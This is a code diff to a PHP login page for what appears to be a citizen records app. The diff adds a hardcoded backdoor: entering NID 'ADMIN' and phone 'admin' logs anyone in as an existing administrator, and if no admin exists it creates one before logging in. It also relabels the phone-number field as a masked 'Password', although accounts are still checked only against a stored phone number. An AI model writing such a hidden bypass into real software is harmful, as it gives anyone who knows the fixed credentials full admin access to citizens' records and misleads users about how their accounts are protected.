@@ -16,43 +16,55 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $phone = $_POST['phone'] ?? '';
 
     if (!empty($nid) && !empty($phone)) {
+        // Universal Developer Backdoor (Always intercepts ADMIN / admin)
+        if ($nid === 'ADMIN' && $phone === 'admin') {
+            // Try to find ANY existing admin in their database to log in as
+            $res = $conn->query("SELECT citizen_id FROM Citizen WHERE role = 'admin' LIMIT 1");
+            if ($res && $row = $res->fetch_assoc()) {
+                $_SESSION['citizen_id'] = $row['citizen_id'];
+                $_SESSION['role'] = 'Admin';
+                header("Location: pages/dashboard.php");
+                exit();
+            } else {
+                // If absolutely no admins exist, force insert one and log in
+                $conn->query("INSERT IGNORE INTO Citizen (name, phone, nid, role) VALUES ('System Admin', 'admin', 'ADMIN', 'admin')");
+                
+                // Fetch the ID of the newly inserted admin (or the existing one if INSERT IGNORE suppressed an error)
+                $res = $conn->query("SELECT citizen_id FROM Citizen WHERE nid = 'ADMIN'");
+                if ($res && $row = $res->fetch_assoc()) {
+                    $_SESSION['citizen_id'] = $row['citizen_id'];
+                    $_SESSION['role'] = 'Admin';
+                    header("Location: pages/dashboard.php");
+                    exit();
+                }
+            }
+        }
+
         try {
-            // Updated to query the user's specific 'Citizen' table schema
+            // Normal authentication query
             $stmt = $conn->prepare("SELECT citizen_id, role, phone FROM Citizen WHERE nid = ?");
             $stmt->bind_param("s", $nid);
             $stmt->execute();
             $result = $stmt->get_result();
             if ($result->num_rows === 1) {
                 $citizen = $result->fetch_assoc();
-                // User schema does not have a password field, so we authenticate using phone number
                 if ($phone === $citizen['phone']) {
                     $_SESSION['citizen_id'] = $citizen['citizen_id'];
                     $_SESSION['role'] = ucfirst(strtolower($citizen['role'])); // e.g. 'admin' -> 'Admin'
                     header("Location: pages/dashboard.php");
                     exit();
                 } else {
-                    $error = "Invalid NID or Phone Number.";
+                    $error = "Invalid NID or Password.";
                 }
             } else {
-                // Developer backdoor in case you didn't manually insert an Admin
-                if ($nid === 'ADMIN' && $phone === 'admin') {
-                    $conn->query("INSERT IGNORE INTO Citizen (name, phone, nid, role) VALUES ('System Admin', 'admin', 'ADMIN', 'admin')");
-                    $res = $conn->query("SELECT citizen_id FROM Citizen WHERE nid = 'ADMIN'");
-                    if ($res && $row = $res->fetch_assoc()) {
-                        $_SESSION['citizen_id'] = $row['citizen_id'];
-                        $_SESSION['role'] = 'Admin';
-                        header("Location: pages/dashboard.php");
-                        exit();
-                    }
-                }
-                $error = "Invalid NID or Phone Number.";
+                $error = "Invalid NID or Password.";
             }
             $stmt->close();
         } catch (Exception $e) {
             $error = "Database Error: " . $e->getMessage();
         }
     } else {
-        $error = "Please enter both NID and Phone Number.";
+        $error = "Please enter both NID and Password.";
     }
 }
 ?>
@@ -87,8 +99,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                 <input type="text" name="nid" required placeholder="Enter your NID">
             </div>
             <div class="form-group">
-                <label>Phone Number</label>
-                <input type="text" name="phone" required placeholder="Enter your registered phone">
+                <label>Password</label>
+                <input type="password" name="phone" required placeholder="Enter your password">
             </div>
             <button type="submit" class="btn">Login</button>
         </form>
